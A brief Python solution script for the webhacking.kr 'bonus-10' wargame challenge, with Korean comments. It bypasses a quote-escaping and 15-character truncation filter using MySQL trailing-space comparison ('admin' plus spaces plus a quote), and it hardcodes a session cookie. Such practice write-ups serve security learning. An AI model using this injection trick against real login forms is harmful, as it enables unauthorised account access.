from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/bonus-10/"
URI = "/index.php"
PHPSESSID = '5m4vrbnhn9upeegf1mv0t1ccmn'

COOKIES = {
    'PHPSESSID' : PHPSESSID
}

DATA = {
    'id' : "admin         '"
}

# 풀이
# 1. MySQL에서 문자열과 공백을 같이 사용하면 비교하는 부분에서 길이가 다른 문자열이 있을 경우 공백을 이용해서 똑같이 맞춘 다음 비교함
# 2. 문제에서 사용한 SQL문 : select 1 from member where length(id)<14 and id='{$_POST['id']}
# 3. 그리고 문제 소스코드를 보면 특정 문자열을 필터링 (' -> '' / \ -> null) 한 후 16글자가 넘어가면 자동으로 15자로 잘라버리는 처리를 함
# 4. 따라서 id를 admin으로 인식시키기 위해 admin + 공백 9개 + '(싱글 쿼터) 를 페이로드로 작성하고 쿼리문을 실행하면 플래그 출력

resp = requests.post(URL + URI, cookies=COOKIES, data=DATA)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)